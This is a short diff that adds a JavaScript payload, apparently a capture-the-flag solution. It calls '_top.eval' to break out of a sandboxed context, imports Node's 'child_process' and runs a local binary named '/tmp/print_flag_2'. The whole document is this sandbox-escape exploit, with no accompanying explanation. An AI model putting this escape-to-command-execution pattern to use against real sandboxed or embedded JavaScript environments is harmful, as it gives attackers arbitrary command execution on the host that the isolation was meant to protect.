@@ -1,0 +1,7 @@
+_top.eval("\
+	import('child_process').then(cp => {\
+		cp.exec('/tmp/print_flag_2', (error, stdout, stderr) => {\
+			console.log(error, stdout, stderr);\
+		});\
+	});\
+");
